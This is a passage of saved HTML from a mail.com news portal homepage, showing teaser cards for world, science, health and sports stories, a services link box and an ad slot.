</noscript><img alt="Preview Image" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/952/9610952,pd=1,f=teaser-list-s/preview-image.jpg" data-srcset="https://i0.mail.com/mcom/952/9610952%2Cpd=1%2Cf=teaser-list-s/preview-image.jpg 120w, https://i0.mail.com/mcom/952/9610952%2Cpd=1%2Cf=teaser-list-l/preview-image.jpg 240w" data-sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" class="lazyImg" srcset="https://i0.mail.com/mcom/952/9610952%2Cpd=1%2Cf=teaser-list-s/preview-image.jpg 120w, https://i0.mail.com/mcom/952/9610952%2Cpd=1%2Cf=teaser-list-l/preview-image.jpg 240w" sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" src="files/preview-image(4).jpg"></span></figure><span class="teaser-overlay overlay-video"></span><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        World</span>
        <div class="teaser-headline">Impeachment views split along party lines</div>
</div>
    </div>
</a></div>
</div>
  </div>
</div>
<div class="mod-container">
    <div class="container-headline" data-theme="sci-tech" id="science_technology">
      <span><a href="https://www.mail.com/int/scitech/#.1258-stage-set5-1" target="_top">Science &amp; Technology</a></span>
      <a href="https://www.mail.com/int/scitech/#.1258-stage-set5-2" target="_top">View More</a></div>
<div class="blocks blocks-5">
    <div class="block">
        <div class="mod mod-teaser teaser-card" data-theme="sci-tech" data-init="true">
    <a href="https://www.mail.com/int/scitech/health/9612688-north-america-trade-pact-deals-rare-setback-to-big.html#.1258-stage-set5-3" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="" data-src="https://i0.mail.com/mcom/690/9612690,pd=2,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/690/9612690%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/690/9612690%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/690/9612690%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/690/9612690%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 460px">
<noscript>
<img alt="" crossorigin="anonymous" src="https://i0.mail.com/mcom/690/9612690,pd=2,f=teaser-card-s/.jpg" srcset="https://i0.mail.com/mcom/690/9612690%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/690/9612690%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/690/9612690%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/690/9612690%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 460px" />
</noscript><img alt="" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/690/9612690,pd=2,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/690/9612690%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/690/9612690%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/690/9612690%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/690/9612690%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 460px" class="lazyImg" srcset="https://i0.mail.com/mcom/690/9612690%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/690/9612690%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/690/9612690%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/690/9612690%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 460px" src="files/jpg(14)"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        Health</span>
        <div class="teaser-headline">North America trade pact deals rare setback to Big Pharma</div>
</div>
    </div>
</a></div>
</div>
    <div class="block">
      <div class="mod mod-teaser teaser-list" data-theme="sci-tech" data-init="true">
    <a href="https://www.mail.com/int/scitech/news/9612712-greece-advisory-body-votes-to-move-antiquities-sub.html#.1258-stage-set5-4" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="" data-src="https://i0.mail.com/mcom/916/9612916,pd=1,f=teaser-list-s/.jpg" data-srcset="https://i0.mail.com/mcom/916/9612916%2Cpd=1%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/916/9612916%2Cpd=1%2Cf=teaser-list-l/.jpg 240w" data-sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px">
<noscript>
<img alt="" crossorigin="anonymous" src="https://i0.mail.com/mcom/916/9612916,pd=1,f=teaser-list-s/.jpg" srcset="https://i0.mail.com/mcom/916/9612916%2Cpd=1%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/916/9612916%2Cpd=1%2Cf=teaser-list-l/.jpg 240w" sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" />
</noscript><img alt="" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/916/9612916,pd=1,f=teaser-list-s/.jpg" data-srcset="https://i0.mail.com/mcom/916/9612916%2Cpd=1%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/916/9612916%2Cpd=1%2Cf=teaser-list-l/.jpg 240w" data-sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" class="lazyImg" srcset="https://i0.mail.com/mcom/916/9612916%2Cpd=1%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/916/9612916%2Cpd=1%2Cf=teaser-list-l/.jpg 240w" sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" src="files/jpg(15)"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        Sci/Tech news</span>
        <div class="teaser-headline">Greece: Advisory body votes to move antiquities for subway</div>
</div>
    </div>
</a></div>
<div class="mod mod-teaser teaser-list" data-theme="sci-tech" data-init="true">
    <a href="https://www.mail.com/int/scitech/news/9611828-putin-trump-was-impeached-far-fetched-reasons.html#.1258-stage-set5-5" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="Vladimir Putin" data-src="https://i0.mail.com/mcom/298/9612298,pd=2,f=teaser-list-s/vladimir-putin.jpg" data-srcset="https://i0.mail.com/mcom/298/9612298%2Cpd=2%2Cf=teaser-list-s/vladimir-putin.jpg 120w, https://i0.mail.com/mcom/298/9612298%2Cpd=2%2Cf=teaser-list-l/vladimir-putin.jpg 240w" data-sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px">
<noscript>
<img alt="Vladimir Putin" crossorigin="anonymous" src="https://i0.mail.com/mcom/298/9612298,pd=2,f=teaser-list-s/vladimir-putin.jpg" srcset="https://i0.mail.com/mcom/298/9612298%2Cpd=2%2Cf=teaser-list-s/vladimir-putin.jpg 120w, https://i0.mail.com/mcom/298/9612298%2Cpd=2%2Cf=teaser-list-l/vladimir-putin.jpg 240w" sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" />
</noscript><img alt="Vladimir Putin" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/298/9612298,pd=2,f=teaser-list-s/vladimir-putin.jpg" data-srcset="https://i0.mail.com/mcom/298/9612298%2Cpd=2%2Cf=teaser-list-s/vladimir-putin.jpg 120w, https://i0.mail.com/mcom/298/9612298%2Cpd=2%2Cf=teaser-list-l/vladimir-putin.jpg 240w" data-sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" class="lazyImg" srcset="https://i0.mail.com/mcom/298/9612298%2Cpd=2%2Cf=teaser-list-s/vladimir-putin.jpg 120w, https://i0.mail.com/mcom/298/9612298%2Cpd=2%2Cf=teaser-list-l/vladimir-putin.jpg 240w" sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" src="files/vladimir-putin(1).jpg"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        Sci/Tech news</span>
        <div class="teaser-headline">Putin says Trump was impeached for 'far-fetched' reasons</div>
</div>
    </div>
</a></div>
</div>
    <div class="block">
        <div class="mod mod-teaser teaser-card" data-theme="sci-tech" data-init="true">
    <a href="https://www.mail.com/int/scitech/health/9612156-81-horses-culled-turkish-island-amid-disease-outbr.html#.1258-stage-set5-6" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="" data-src="https://i0.mail.com/mcom/246/9612246,pd=1,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/246/9612246%2Cpd=1%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/246/9612246%2Cpd=1%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/246/9612246%2Cpd=1%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/246/9612246%2Cpd=1%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px">
<noscript>
<img alt="" crossorigin="anonymous" src="https://i0.mail.com/mcom/246/9612246,pd=1,f=teaser-card-s/.jpg" srcset="https://i0.mail.com/mcom/246/9612246%2Cpd=1%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/246/9612246%2Cpd=1%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/246/9612246%2Cpd=1%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/246/9612246%2Cpd=1%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" />
</noscript><img alt="" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/246/9612246,pd=1,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/246/9612246%2Cpd=1%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/246/9612246%2Cpd=1%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/246/9612246%2Cpd=1%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/246/9612246%2Cpd=1%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" class="lazyImg" srcset="https://i0.mail.com/mcom/246/9612246%2Cpd=1%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/246/9612246%2Cpd=1%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/246/9612246%2Cpd=1%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/246/9612246%2Cpd=1%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" src="files/jpg(16)"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        Health</span>
        <div class="teaser-headline">81 horses culled on Turkish island amid disease outbreak  </div>
</div>
    </div>
</a></div>
</div>
    <div class="block">
        <div class="mod mod-teaser teaser-card" data-theme="sci-tech" data-init="true">
    <a href="https://www.mail.com/int/scitech/news/9611978-eu-court-sides-with-activist-facebook-data-transfe.html#.1258-stage-set5-7" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="" data-src="https://i0.mail.com/mcom/980/9611980,pd=2,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/980/9611980%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/980/9611980%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/980/9611980%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/980/9611980%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px">
<noscript>
<img alt="" crossorigin="anonymous" src="https://i0.mail.com/mcom/980/9611980,pd=2,f=teaser-card-s/.jpg" srcset="https://i0.mail.com/mcom/980/9611980%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/980/9611980%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/980/9611980%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/980/9611980%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" />
</noscript><img alt="" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/980/9611980,pd=2,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/980/9611980%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/980/9611980%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/980/9611980%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/980/9611980%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" class="lazyImg" srcset="https://i0.mail.com/mcom/980/9611980%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/980/9611980%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/980/9611980%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/980/9611980%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" src="files/jpg(17)"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        Sci/Tech news</span>
        <div class="teaser-headline">EU court sides with activist in Facebook data transfer fight</div>
</div>
    </div>
</a></div>
</div>
    <div class="block">
        <div class="mod mod-teaser teaser-card" data-theme="sci-tech" data-init="true">
    <a href="https://www.mail.com/int/scitech/health/9611086-who-sees-tobacco-drop-men-vaping-effects-unclear.html#.1258-stage-set5-8" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="" data-src="https://i0.mail.com/mcom/088/9611088,pd=1,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/088/9611088%2Cpd=1%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/088/9611088%2Cpd=1%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/088/9611088%2Cpd=1%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/088/9611088%2Cpd=1%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px">
<noscript>
<img alt="" crossorigin="anonymous" src="https://i0.mail.com/mcom/088/9611088,pd=1,f=teaser-card-s/.jpg" srcset="https://i0.mail.com/mcom/088/9611088%2Cpd=1%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/088/9611088%2Cpd=1%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/088/9611088%2Cpd=1%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/088/9611088%2Cpd=1%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" />
</noscript><img alt="" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/088/9611088,pd=1,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/088/9611088%2Cpd=1%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/088/9611088%2Cpd=1%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/088/9611088%2Cpd=1%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/088/9611088%2Cpd=1%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" class="lazyImg" srcset="https://i0.mail.com/mcom/088/9611088%2Cpd=1%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/088/9611088%2Cpd=1%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/088/9611088%2Cpd=1%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/088/9611088%2Cpd=1%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" src="files/jpg(18)"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        Health</span>
        <div class="teaser-headline">WHO sees tobacco drop among men, but vaping effects unclear</div>
</div>
    </div>
</a></div>
</div>
    </div>
</div>
<div class="mod-container">
    <div class="blocks blocks-2">
    <div class="block">
        <div class="mod mod-tool" data-theme="mixed" data-init="true">
  <div class="services wide" data-style="background-image:url(https://i0.mail.com/mcom/594/3733594,pd=1/envelope.jpg)" style="background-image: url(&quot;https://i0.mail.com/mcom/594/3733594,pd=1/envelope.jpg&quot;);">
      <div class="hl">mail.com services</div>
      <ul><li><a href="https://www.mail.com/mail/mail-collector/#.1258-stage-linkbox1-1">Mail Collector</a></li><li><a href="https://www.mail.com/mail/spam-filter/#.1258-stage-linkbox1-2">Junkmail Filter</a></li><li><a href="https://www.mail.com/toolbar/chrome/#.1258-stage-linkbox1-3">Mail Notifier</a></li><li><a href="https://www.mail.com/mail/create-email-account/#.1258-stage-linkbox1-4">Create your Email account</a></li></ul></div>
  </div></div>
    <div class="block">
        <div class="ad-container ad-content mod mod-inviewcheck" id="gpt-medrec2" data-init="true" data-adcalled="true" data-google-query-id="CMWahOSrwuYCFVTDuwgdRFYK3w">
  
<div id="google_ads_iframe_/6840/p6840.mail.com/HomePage_4__container__" style="border: 0pt none; display: inline-block; width: 300px; height: 250px;"><iframe frameborder="0" src="files/container(2).html" id="google_ads_iframe_/6840/p6840.mail.com/HomePage_4" title="3rd party ad content" name="" scrolling="no" marginwidth="0" marginheight="0" width="300" height="250" data-is-safeframe="true" sandbox="allow-forms allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" data-google-container-id="6" style="border: 0px; vertical-align: bottom;" data-load-complete="true"></iframe></div></div></div>
    </div>
</div>
<div class="mod-container">
    <div class="container-headline" data-theme="sport" id="sports">
      <span><a href="https://www.mail.com/int/sports/#.1258-stage-set7-1" target="_top">Sports</a></span>
      <a href="https://www.mail.com/int/sports/#.1258-stage-set7-2" target="_top">View More</a></div>
<div class="blocks blocks-5">
    <div class="block">
        <div class="mod mod-teaser teaser-card" data-theme="sport" data-init="true">
    <a href="https://www.mail.com/int/sports/soccer/9612926-strike-force-duel-dygualdo-vs-lula-serie-title-rac.html#.1258-stage-set7-3" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="" data-src="https://i0.mail.com/mcom/926/9610926,pd=1,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/926/9610926%2Cpd=1%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/926/9610926%2Cpd=1%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/926/9610926%2Cpd=1%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/926/9610926%2Cpd=1%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 460px">
<noscript>
<img alt="" crossorigin="anonymous" src="https://i0.mail.com/mcom/926/9610926,pd=1,f=teaser-card-s/.jpg" srcset="https://i0.mail.com/mcom/926/9610926%2Cpd=1%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/926/9610926%2Cpd=1%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/926/9610926%2Cpd=1%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/926/9610926%2Cpd=1%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 460px" />
</noscript><img alt="" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/926/9610926,pd=1,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/926/9610926%2Cpd=1%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/926/9610926%2Cpd=1%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/926/9610926%2Cpd=1%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/926/9610926%2Cpd=1%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 460px" class="lazyImg" srcset="https://i0.mail.com/mcom/926/9610926%2Cpd=1%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/926/9610926%2Cpd=1%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/926/9610926%2Cpd=1%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/926/9610926%2Cpd=1%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 460px" src="files/jpg(19)"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        Football</span>
        <div class="teaser-headline">Strike force duel: Dygualdo vs. LuLa for Serie A title race</div>
</div>
    </div>
</a></div>
</div>
    <div class="block">
        <div class="mod mod-teaser teaser-card" data-theme="sport" data-init="true">
    <a href="https://www.mail.com/int/sports/tennis/9612852-nadal-wins-atp-sportsmanship-award-murray-comeback.html#.1258-stage-set7-4" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="" data-src="https://i0.mail.com/mcom/992/9557992,pd=2,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/992/9557992%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/992/9557992%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/992/9557992%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/992/9557992%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px">
<noscript>
<img alt="" crossorigin="anonymous" src="https://i0.mail.com/mcom/992/9557992,pd=2,f=teaser-card-s/.jpg" srcset="https://i0.mail.com/mcom/992/9557992%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/992/9557992%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/992/9557992%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/992/9557992%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" />
</noscript><img alt="" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/992/9557992,pd=2,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/992/9557992%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/992/9557992%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/992/9557992%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/992/9557992%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" class="lazyImg" srcset="https://i0.mail.com/mcom/992/9557992%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/992/9557992%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/992/9557992%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/992/9557992%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" src="files/jpg(20)"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        Tennis</span>
        <div class="teaser-headline">Nadal wins ATP sportsmanship award, Murray comeback player</div>
</div>
    </div>
</a></div>
</div>
    <div class="block">
        <div class="mod mod-teaser teaser-card" data-theme="sport" data-init="true">
    <a href="https://www.mail.com/int/sports/other/9612022-russia-plans-to-file-appeal-olympic-ban.html#.1258-stage-set7-5" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="" data-src="https://i0.mail.com/mcom/916/9611916,pd=2,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/916/9611916%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/916/9611916%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/916/9611916%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/916/9611916%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px">
<noscript>
<img alt="" crossorigin="anonymous" src="https://i0.mail.com/mcom/916/9611916,pd=2,f=teaser-card-s/.jpg" srcset="https://i0.mail.com/mcom/916/9611916%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/916/9611916%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/916/9611916%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/916/9611916%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" />
